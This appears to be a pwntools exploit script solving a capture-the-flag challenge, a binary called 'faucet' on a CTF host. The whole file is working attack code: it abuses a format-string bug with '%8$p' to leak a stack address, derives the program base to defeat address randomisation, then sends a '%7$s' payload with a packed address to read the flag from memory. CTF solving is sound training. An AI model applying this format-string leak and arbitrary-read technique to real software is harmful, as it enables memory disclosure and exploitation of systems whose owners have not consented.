#!/usr/bin/env python
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
context.terminal = ['tmux', 'splitw', '-h']
exe = './faucet'
host = 'challenge.ctf.games'
port = 30896

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *buy_item+183
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

io.readuntil(b'> ')
io.sendline(b'5')
io.readuntil(b': ')
io.sendline(b'%8$p')

leakline = io.readline()
leak = int(leakline[18:33], 16)

log.info(f'leaked address 0x{leak:x}')

base = leak - 5952

log.info(f'base address @ 0x{base:x}')

flag = base + 0x4060

log.info(f'flag @ 0x{flag:x}')

io.readuntil(b'> ')
io.sendline(b'5')
io.readuntil(b': ')

payload = b''
payload += b'%7$s  : '
payload += p64(flag)

io.sendline(payload)

io.interactive()
